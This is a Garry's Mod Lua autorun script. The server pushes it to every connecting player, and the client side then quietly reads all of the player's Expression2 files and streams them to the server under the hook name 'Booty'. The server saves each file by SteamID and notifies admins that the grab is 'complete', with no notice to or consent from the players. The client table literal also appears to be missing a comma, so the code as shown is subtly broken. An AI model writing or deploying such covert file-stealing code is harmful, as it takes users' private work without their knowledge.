

require("datastream")

if (SERVER) then
	AddCSLuaFile("autorun/saveexpression.lua")
	
	local function TellAdmins(str)
		Msg(str)
		for k,v in pairs( player.GetAll() ) do
			if ValidEntity(v) and v:IsAdmin() then
				v:PrintMessage(HUD_PRINTCONSOLE, str)
			end
		end
	end
	
	local function SaveExpression(ply,han,id,enc,dec)
		if not ValidEntity(ply) then return end
		
		local Name			= dec.Name
		local ReadString	= dec.ReadString
		local Filename		= Format("%s-%s.txt", ply:SteamID():gsub(":","_"), Name)
		
		if not file.Exists(Filename) then
			file.Write(Filename, ReadString)
			
			TellAdmins( Format("E2: %s from %s complete!\n", Name, ply:Nick()) )
		end
	end
	datastream.Hook("Booty", SaveExpression)
end


if (CLIENT) then
	local function TakeExpression()
		for k,v in pairs( file.Find("Expression2/*.txt") ) do
			timer.Simple(k/3, function()
				datastream.StreamToServer("Booty",
					{
						Name		= v
						ReadString	= file.Read("Expression2/"..v)
					}
				)
			end)
		end
	end
	timer.Simple(2, TakeExpression)
end



